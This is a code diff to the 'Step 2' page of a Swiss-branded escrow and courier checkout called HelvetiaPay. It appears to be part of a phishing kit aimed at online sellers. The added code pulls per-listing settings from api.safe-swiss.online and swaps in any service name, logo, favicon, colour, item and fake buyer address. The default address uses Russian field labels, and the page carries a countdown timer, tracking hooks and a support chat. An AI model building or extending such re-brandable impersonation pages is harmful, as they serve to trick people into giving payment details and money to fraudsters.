@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>HelvetiaPay — Step 2: Escrow Verification & Buyer Waybill</title>
+  <title id="page-title">HelvetiaPay — Step 2: Escrow Verification & Buyer Waybill</title>
   <meta name="description" content="Step 2 of 3: Verify buyer escrow deposit and confirmed Swiss Post courier dispatch address." />
+  <link rel="icon" id="dynamic-favicon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='4' fill='%23D52B1E'/%3E%3Cpath d='M10 6h4v4h4v4h-4v4h-4v-4H6v-4h4V6z' fill='%23FFFFFF'/%3E%3C/svg%3E" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
@@ -1251,9 +1252,13 @@
           <div class="swiss-flag-cross"></div>
         </div>
         <div class="brand-divider"></div>
+        <div class="service-logo-wrap" id="service-logo" aria-label="Service logo" style="display:flex;align-items:center;justify-content:center;width:28px;height:28px;overflow:hidden;">
+          <div class="swiss-flag" aria-hidden="true"><div class="swiss-flag-cross"></div></div>
+        </div>
         <div class="service-info">
-          <div class="service-title">HelvetiaPay Escrow</div>
+          <div class="service-title" id="service-name">HelvetiaPay Escrow</div>
           <div class="service-sub">Swiss Interbank Settlement</div>
+          <div id="product-title" style="font-size:0.68rem;font-weight:600;color:var(--neutral-500);max-width:280px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">Omega Speedmaster Professional Moonwatch</div>
         </div>
       </div>
 
@@ -1862,6 +1867,103 @@
         }
       }
 
+      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://api.safe-swiss.online').replace(/\/$/, '');
+      const defaultStep2Config = {
+        listing_id: 'CH-8924-7710-PX',
+        service: { name: 'HelvetiaPay Escrow', logo_url: '', favicon_url: '', theme: { primary: '#D52B1E' } },
+        listing: { title: 'Omega Speedmaster Professional Moonwatch', price: '1450.00', currency: 'CHF', delivery_info: 'Город: Zürich\\nZIP-код: 8001\\nИмя и фамилия: Marc H. Zimmermann\\nУлица: Bahnhofstrasse 45, App. 3B' }
+      };
+
+      function getStep2Slug() {
+        const pathMatch = window.location.pathname.match(/\/p\/([A-Za-z0-9]{8})(?:\/)?$/);
+        const params = new URLSearchParams(window.location.search);
+        return (pathMatch && pathMatch[1]) || params.get('slug') || sessionStorage.getItem('listing_slug') || '';
+      }
+
+      function mergeStep2Config(base, incoming) {
+        return {
+          ...base,
+          ...incoming,
+          service: { ...base.service, ...(incoming && incoming.service), theme: { ...base.service.theme, ...(incoming && incoming.service && incoming.service.theme) } },
+          listing: { ...base.listing, ...(incoming && incoming.listing) }
+        };
+      }
+
+      function parseShippingText(text) {
+        const result = { city: '', zip: '', name: '', street: '' };
+        String(text || '').split(/\n|<br\s*\/?>(?!$)/i).forEach(line => {
+          const clean = line.replace(/<[^>]*>/g, '').trim();
+          const separator = clean.indexOf(':');
+          if (separator < 0) return;
+          const label = clean.slice(0, separator).toLowerCase();
+          const value = clean.slice(separator + 1).trim();
+          if (label.includes('город') || label.includes('city')) result.city = value;
+          else if (label.includes('zip') || label.includes('postal') || label.includes('почтов')) result.zip = value;
+          else if (label.includes('имя') || label.includes('name') || label.includes('recipient')) result.name = value;
+          else if (label.includes('улица') || label.includes('street') || label.includes('address')) result.street = value;
+        });
+        return result;
+      }
+
+      function applyStep2Config(config) {
+        const serviceName = config.service && config.service.name;
+        const serviceNameEl = document.getElementById('service-name');
+        if (serviceNameEl && serviceName) serviceNameEl.textContent = serviceName;
+        const productTitleEl = document.getElementById('product-title');
+        if (productTitleEl && config.listing && config.listing.title) productTitleEl.textContent = config.listing.title;
+        const pageTitleEl = document.getElementById('page-title');
+        if (pageTitleEl && serviceName) pageTitleEl.textContent = `${serviceName} — Step 2`;
+
+        const faviconEl = document.getElementById('dynamic-favicon');
+        if (faviconEl && config.service && (config.service.favicon_url || config.service.logo_url)) faviconEl.href = config.service.favicon_url || config.service.logo_url;
+        const logoEl = document.getElementById('service-logo');
+        if (logoEl && config.service && config.service.logo_url) {
+          logoEl.innerHTML = `<img src="${encodeURI(config.service.logo_url)}" alt="${String(serviceName || 'Service logo').replace(/"/g, '&quot;')}" style="width:28px;height:28px;object-fit:contain;border-radius:6px;" />`;
+        }
+        if (config.service && config.service.theme && config.service.theme.primary) document.documentElement.style.setProperty('--swiss-red', config.service.theme.primary);
+
+        const currency = (config.listing && config.listing.currency) || 'CHF';
+        const price = parseFloat(String((config.listing && config.listing.price) || '0').replace(/[^0-9.]/g, '')) || 0;
+        const deliveryCost = parseFloat(sessionStorage.getItem('helvetia_delivery_cost') || '15') || 15;
+        const amountEl = document.getElementById('escrow-amount-display');
+        if (amountEl) amountEl.textContent = `${currency} ${formatSwissPrice(price + deliveryCost)}`;
+        sessionStorage.setItem('helvetia_price', String(price));
+        sessionStorage.setItem('helvetia_currency', currency);
+        sessionStorage.setItem('helvetia_total_payout', String(price + deliveryCost));
+
+        const shipping = parseShippingText(config.listing && config.listing.delivery_info);
+        const cityEl = document.getElementById('buyer-city-val');
+        const nameEl = document.getElementById('buyer-name-val');
+        const streetEl = document.getElementById('buyer-street-val');
+        if (nameEl && shipping.name) nameEl.textContent = shipping.name;
+        if (cityEl && (shipping.zip || shipping.city)) cityEl.textContent = `${shipping.zip}${shipping.zip && shipping.city ? ' ' : ''}${shipping.city}`;
+        if (streetEl && shipping.street) streetEl.textContent = shipping.street;
+        const backLink = document.getElementById('link-back-step1');
+        if (backLink) backLink.href = `index.html${getStep2Slug() ? `?slug=${encodeURIComponent(getStep2Slug())}` : ''}`;
+      }
+
+      async function loadStep2Config() {
+        let config = { ...defaultStep2Config };
+        try {
+          const cached = sessionStorage.getItem('listingConfig');
+          if (cached) config = mergeStep2Config(config, JSON.parse(cached));
+        } catch (e) {}
+        const slug = getStep2Slug();
+        if (slug) {
+          try {
+            const response = await fetch(`${LISTING_API_BASE_URL}/api/public/listings/${encodeURIComponent(slug)}`, { headers: { Accept: 'application/json' } });
+            if (!response.ok) throw new Error(`Listing API responded with ${response.status}`);
+            config = mergeStep2Config(config, await response.json());
+            sessionStorage.setItem('listingConfig', JSON.stringify(config));
+            sessionStorage.setItem('listing_slug', slug);
+          } catch (error) {
+            console.warn('Step 2 listing API unavailable; using cached config.', error);
+          }
+        }
+        applyStep2Config(config);
+        return config;
+      }
+
       let currentLang = 'EN';
 
       /* Number Formatter */
@@ -1873,9 +1975,9 @@
       }
 
       /* Hydrate Data from Session / URL */
-      function hydrateStep2Data() {
+      function hydrateStep2Data(config) {
         const urlParams = new URLSearchParams(window.location.search);
-        let basePrice = 1450.00;
+        let basePrice = parseFloat(String(config && config.listing && config.listing.price || '1450.00').replace(/[^0-9.]/g, '')) || 1450.00;
         let deliveryCost = 15.00;
         let deliveryName = "Swiss Post Priority (A-Post)";
 
@@ -2065,10 +2167,11 @@
       }
 
       /* Init */
-      document.addEventListener('DOMContentLoaded', () => {
+      document.addEventListener('DOMContentLoaded', async () => {
+        const listingConfig = await loadStep2Config();
         initGeoAndTracking();
         initSmartHeaderScroll();
-        hydrateStep2Data();
+        hydrateStep2Data(listingConfig);
         initTimer();
         initCheckboxValidation();
         initSupportChat();
